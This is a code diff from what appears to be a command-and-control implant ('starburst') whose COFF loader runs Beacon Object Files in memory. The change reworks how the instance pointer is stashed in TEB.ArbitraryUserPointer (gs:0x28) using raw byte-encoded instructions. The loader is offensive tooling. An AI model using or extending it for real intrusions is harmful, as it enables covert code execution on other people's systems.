@@ -66,18 +66,28 @@ struct COFF_RELOCATION {
 #define IMAGE_REL_AMD64_REL32_4  0x0008
 #define IMAGE_REL_AMD64_REL32_5  0x0009
 
-// TEB.ArbitraryUserPointer helpers for passing instance to callbacks
+// TEB.ArbitraryUserPointer at gs:0x28
+// Use raw .byte encoding for gs segment access to avoid Intel/AT&T syntax issues
 static inline auto declfn coff_set_inst( instance* p ) -> void {
-#ifdef _M_X64
-    __asm__ volatile ( "movq %0, %%gs:0x28" :: "r"(p) : "memory" );
+#ifdef _WIN64
+    // mov gs:[0x28], rcx  =  65 48 89 0c 25 28 00 00 00
+    register void* val __asm__("rcx") = reinterpret_cast<void*>(p);
+    __asm__ volatile (
+        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
+        :: "c"(val) : "memory"
+    );
 #endif
 }
 
 static inline auto declfn coff_get_inst() -> instance* {
-#ifdef _M_X64
-    instance* p;
-    __asm__ volatile ( "movq %%gs:0x28, %0" : "=r"(p) );
-    return p;
+#ifdef _WIN64
+    // mov rax, gs:[0x28]  =  65 48 8b 04 25 28 00 00 00
+    void* result;
+    __asm__ volatile (
+        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
+        : "=a"(result)
+    );
+    return static_cast<instance*>(result);
 #else
     return nullptr;
 #endif
@@ -496,10 +506,7 @@ auto declfn starburst::cmd_execute_coff(
     if ( inst.coff.output_data ) inst.coff.output_data[0] = '\0';
 
     // save old ArbitraryUserPointer, set instance for beacon callbacks
-    void* old_aup = nullptr;
-#ifdef _M_X64
-    __asm__ volatile ( "movq %%gs:0x28, %0" : "=r"(old_aup) );
-#endif
+    instance* old_aup = coff_get_inst();
     coff_set_inst( &inst );
 
     // execute entry point: void go(char* args, int len)
@@ -508,7 +515,7 @@ auto declfn starburst::cmd_execute_coff(
     go( reinterpret_cast<char*>( args_data ), args_len );
 
     // restore ArbitraryUserPointer
-    coff_set_inst( static_cast<instance*>( old_aup ) );
+    coff_set_inst( old_aup );
 
     // collect output
     if ( inst.coff.output_data && inst.coff.output_length > 0 ) {
